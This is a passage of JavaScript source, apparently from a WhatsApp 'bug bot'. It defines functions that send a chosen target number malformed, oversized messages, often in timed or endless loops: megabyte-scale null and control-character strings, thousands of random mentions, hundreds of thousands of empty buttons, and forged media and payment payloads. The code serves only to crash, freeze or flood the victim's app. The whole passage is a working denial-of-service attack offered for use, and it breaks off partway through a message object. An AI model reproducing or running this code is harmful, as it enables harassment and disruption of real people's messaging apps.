        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "moro",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "moro",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "moro!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "moro"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "moro",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "moro"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "moro",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "moro",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "moro",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });
}
//delay invis v2
async function iniochalexDelayV4Fix(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "moro",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " mroo " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `moro`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "moro",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "moro",
                                fileName: "moro",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(75000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "moro",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "moro",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "moro",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    while (true) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Lexcaa - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ExecutedTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "moro‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "moro",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    while (true) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsgg = {
        interactiveMessage: {
            body: {
                text: "moro",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "moro",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acaLuxYou = generateWAMessageFromContent(target, LexzyyMsgg, {});

    await sock.relayMessage(target, acaLuxYou.message, {
        participant: target,
        messageId: acaLuxYou.key.id
    });

    const Msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro",
                    },
                    nativeFlowMessage: {
                        button: "\u5000".repeat(75000),
                    },
                },
            },
        },
    };

    const Msg2 = generateWAMessageFromContent(target, Msg, {});

    await sock.relayMessage(target, Msg2.message, {
        participant: target,
        messageId: Msg2.key.id
    });

    const iniochalexx = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "moro",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 500000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, iniochalexx, {
        participant: target,
    });

    const bpklo = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
